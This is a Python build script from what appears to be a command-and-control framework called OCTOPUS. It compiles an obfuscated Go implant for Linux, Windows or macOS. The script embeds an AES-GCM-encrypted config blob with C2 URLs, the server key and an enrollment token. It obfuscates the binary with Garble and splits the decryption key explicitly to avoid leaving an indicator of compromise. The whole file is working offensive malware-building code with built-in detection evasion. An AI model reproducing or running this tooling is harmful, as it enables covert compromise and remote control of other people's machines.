#!/usr/bin/env python3
"""
Automated Go Implant Build Pipeline

Features:
- Reads the generated X25519 C2 Server Public Key
- Injects the public key and C2 URL into the implant at build time via ldflags
- Compiles using Garble for heavy obfuscation (-tiny -literals)
"""

import base64
import hashlib
import json
import os
import re
import subprocess
import sys

from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import x25519

from core.c2.protocol import C2_SESSION_KDF_CONTEXT
from core.version import APPLICATION_VERSION

C_GREEN = "\033[92m"
C_YELLOW = "\033[93m"
C_RED = "\033[91m"
C_CYAN = "\033[96m"
C_RESET = "\033[0m"

_TOOLCHAIN_FILE = "toolchain.json"


def _runtime_data_dir() -> str:
    """Resolve writable C2 state without ever falling back to site-packages."""

    configured = os.environ.get("OCTOPUS_DATA_DIR", "").strip()
    if configured:
        return os.path.abspath(os.path.expanduser(configured))

    if os.name == "nt":
        windows_state = os.environ.get("LOCALAPPDATA") or os.environ.get("APPDATA")
        if windows_state:
            return os.path.abspath(os.path.join(os.path.expanduser(windows_state), "Octopus"))
        return os.path.abspath(os.path.expanduser("~/AppData/Local/Octopus"))

    xdg_state = os.environ.get("XDG_STATE_HOME", "").strip()
    if xdg_state and os.path.isabs(xdg_state):
        return os.path.join(xdg_state, "octopus")
    return os.path.abspath(os.path.expanduser("~/.local/state/octopus"))


def _load_toolchain_contract(module_dir: str) -> tuple[str, str]:
    """Load and validate the exact, release-owned Go toolchain contract."""

    contract_path = os.path.join(module_dir, _TOOLCHAIN_FILE)
    with open(contract_path, encoding="utf-8") as handle:
        payload = json.load(handle)
    if not isinstance(payload, dict) or set(payload) != {"schema_version", "go", "garble"}:
        raise RuntimeError("Invalid C2 toolchain contract fields")
    if payload["schema_version"] != 1:
        raise RuntimeError("Unsupported C2 toolchain contract schema")

    go_version = payload["go"]
    garble_version = payload["garble"]
    if not isinstance(go_version, str) or re.fullmatch(r"go\d+\.\d+\.\d+", go_version) is None:
        raise RuntimeError("Invalid pinned Go version in C2 toolchain contract")
    if not isinstance(garble_version, str) or re.fullmatch(r"v\d+\.\d+\.\d+", garble_version) is None:
        raise RuntimeError("Invalid pinned Garble version in C2 toolchain contract")
    return go_version, garble_version


def _verify_toolchain(module_dir: str, env: dict[str, str]) -> tuple[str, str]:
    """Verify exact local tool versions without resolving or downloading tools."""

    expected_go, expected_garble = _load_toolchain_contract(module_dir)
    go_result = subprocess.run(
        ["go", "env", "GOVERSION"],
        cwd=module_dir,
        env=env,
        check=True,
        capture_output=True,
        text=True,
        timeout=15,
    )
    actual_go = go_result.stdout.strip()
    if actual_go != expected_go:
        raise RuntimeError(f"C2 build requires Go {expected_go}; found {actual_go or 'unknown'}")

    garble_result = subprocess.run(
        ["garble", "version"],
        cwd=module_dir,
        env=env,
        check=True,
        capture_output=True,
        text=True,
        timeout=15,
    )
    match = re.search(r"(?:^|\s)mvdan\.cc/garble\s+(v\d+\.\d+\.\d+)(?:\s|$)", garble_result.stdout)
    actual_garble = match.group(1) if match else "unknown"
    if actual_garble != expected_garble:
        raise RuntimeError(f"C2 build requires Garble {expected_garble}; found {actual_garble}")
    return expected_go, expected_garble


def _go_linker_flags(
    config_blob: str,
    key_part1: str,
    key_part2: str,
) -> str:
    """Serialize build-time values, including the canonical wire context."""
    session_context = C2_SESSION_KDF_CONTEXT.decode("ascii")
    return (
        f"-s -w -buildid= -X 'main.EncBlob={config_blob}' "
        f"-X 'main.KP1={key_part1}' "
        f"-X 'main.KP2={key_part2}' "
        f"-X 'main.SessionKDFContext={session_context}'"
    )


def _garble_seed(
    source_file: str,
    module_dir: str,
    os_target: str,
    arch_target: str,
) -> str:
    """Derive a stable obfuscation seed from locked, non-secret build inputs."""

    digest = hashlib.sha256()
    digest.update(b"octopus-garble-seed-v1\0")
    digest.update(os_target.encode("ascii"))
    digest.update(b"\0")
    digest.update(arch_target.encode("ascii"))
    for path in (
        source_file,
        os.path.join(module_dir, "go.mod"),
        os.path.join(module_dir, "go.sum"),
        os.path.join(module_dir, _TOOLCHAIN_FILE),
    ):
        digest.update(b"\0")
        with open(path, "rb") as handle:
            digest.update(handle.read())
    return base64.b64encode(digest.digest()).decode("ascii")


def load_server_pub_key(key_path="data/keys/server_x25519_public.pem") -> str:
    """Return the raw 32-byte X25519 public key as base64."""
    if not os.path.exists(key_path):
        raise FileNotFoundError(f"Public key not found at {key_path}. Start the C2 server first.")

    with open(key_path, "rb") as handle:
        public_key = serialization.load_pem_public_key(handle.read())
    if not isinstance(public_key, x25519.X25519PublicKey):
        raise ValueError("C2 public key is not an X25519 key")
    raw = public_key.public_bytes(
        serialization.Encoding.Raw,
        serialization.PublicFormat.Raw,
    )
    return base64.b64encode(raw).decode("ascii")


def encrypt_config(
    c2_urls: str,
    pins: str,
    server_pub: str,
    enrollment_token: str,
) -> tuple[str, str]:
    """Encrypt config into an AES-GCM blob and return (b64_blob, hex_key)."""
    import json

    from cryptography.hazmat.primitives.ciphers.aead import AESGCM

    config = {
        "urls": c2_urls,
        "pins": pins,
        "pub": server_pub,
        "enrollment_token": enrollment_token,
    }

    plaintext = json.dumps(config).encode("utf-8")
    key = AESGCM.generate_key(bit_length=256)
    aesgcm = AESGCM(key)
    nonce = os.urandom(12)

    ciphertext = aesgcm.encrypt(nonce, plaintext, None)
    blob = base64.b64encode(nonce + ciphertext).decode("utf-8")

    return blob, key.hex()


def build_implant(
    os_target="linux",
    arch_target="amd64",
    c2_urls="http://127.0.0.1:8443",
    pins="",
    enrollment_token="",
):
    core_c2_dir = os.path.dirname(os.path.abspath(__file__))
    data_dir = _runtime_data_dir()
    key_path = os.path.join(data_dir, "keys", "server_x25519_public.pem")
    src_file = os.path.join(core_c2_dir, "implant.go")

    out_ext = ".exe" if os_target == "windows" else ""
    out_file = os.path.join(data_dir, f"implant_{os_target}_{arch_target}{out_ext}")

    if isinstance(c2_urls, (list, tuple)):
        c2_urls = ",".join(str(item) for item in c2_urls)
    if os_target not in {"linux", "windows", "darwin"}:
        raise ValueError(f"Unsupported target OS: {os_target}")
    if arch_target not in {"amd64", "arm64"}:
        raise ValueError(f"Unsupported target architecture: {arch_target}")

    os.makedirs(data_dir, exist_ok=True)
    server_pub = load_server_pub_key(key_path)
    if not enrollment_token:
        from core.c2.enrollment import EnrollmentAuthority

        enrollment_token = EnrollmentAuthority(os.path.join(data_dir, "keys", "enrollment.key")).issue()

    print(f"  {C_CYAN}[*] Starting Garble Build Pipeline for {os_target}/{arch_target}{C_RESET}")
    print(f"  {C_CYAN}[*] Encrypting configuration blob...{C_RESET}")

    config_blob, hex_key = encrypt_config(c2_urls, pins, server_pub, enrollment_token)

    # We split the hex key into two parts to avoid a single static 32-byte string IOC
    key_part1 = hex_key[:32]
    key_part2 = hex_key[32:]

    # Setup ldflags to inject the encrypted blob and split keys.
    ldflags = _go_linker_flags(config_blob, key_part1, key_part2)

    env = os.environ.copy()
    env["GOOS"] = os_target
    env["GOARCH"] = arch_target
    env["CGO_ENABLED"] = "0"
    env["GOPROXY"] = "off"
    env["GOSUMDB"] = "off"
    env["GOWORK"] = "off"
    env["GOTOOLCHAIN"] = "local"
    garble_seed = _garble_seed(src_file, core_c2_dir, os_target, arch_target)

    # Command to build using garble
    cmd = [
        "garble",
        "-seed",
        garble_seed,
        "-tiny",
        "-literals",
        "build",
        "-mod=readonly",
        "-trimpath",
        "-buildvcs=false",
        "-ldflags",
        ldflags,
        "-o",
        out_file,
        src_file,
    ]

    print(f"  {C_CYAN}[*] Verifying exact local Go/Garble toolchain...{C_RESET}")
    try:
        _verify_toolchain(core_c2_dir, env)
    except FileNotFoundError as exc:
        executable = exc.filename or "required executable"
        print(f"  {C_RED}[!] C2 build tool is not installed or not in PATH: {executable}{C_RESET}")
        print(
            f"  {C_YELLOW}Install the exact versions declared in "
            f"core/c2/{_TOOLCHAIN_FILE}; runtime downloads are disabled.{C_RESET}"
        )
        sys.exit(1)
    except subprocess.CalledProcessError as exc:
        detail = (exc.stderr or exc.stdout or "version probe failed").strip()
        print(f"  {C_RED}[!] Failed to inspect the C2 build toolchain: {detail}{C_RESET}")
        sys.exit(1)

    print(f"  {C_CYAN}[*] Verifying pinned Go dependencies...{C_RESET}")
    try:
        subprocess.run(
            ["go", "mod", "verify"],
            cwd=core_c2_dir,
            env=env,
            check=True,
            capture_output=True,
            text=True,
            timeout=300,
        )
    except subprocess.CalledProcessError as e:
        print(f"  {C_RED}[!] Failed to verify Go dependencies:{C_RESET}\n{e.stderr or ''}")
        sys.exit(1)

    # Do not print linker arguments: they contain the encrypted configuration
    # key material and must not enter logs or terminal history.
    print(f"  {C_CYAN}[*] Running locked offline Garble build...{C_RESET}")

    try:
        subprocess.run(
            cmd,
            env=env,
            cwd=core_c2_dir,
            check=True,
            timeout=600,
        )
        print(f"  {C_GREEN}[+] Build complete: {out_file}{C_RESET}")
        return out_file
    except subprocess.CalledProcessError as e:
        raise RuntimeError(f"Go implant build failed: {e}") from e


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description=f"OCTOPUS v{APPLICATION_VERSION} Implant Builder")
    parser.add_argument("--os", default="linux", help="Target OS (linux/windows/darwin)")
    parser.add_argument("--arch", default="amd64", help="Target Architecture (amd64/arm64)")
    parser.add_argument("--urls", default="http://127.0.0.1:8443", help="Comma-separated list of C2 URLs (Fallbacks)")
    parser.add_argument("--pins", default="", help="Comma-separated list of SHA-256 SPKI base64 pins")

    args = parser.parse_args()
    build_implant(args.os, args.arch, args.urls, args.pins)
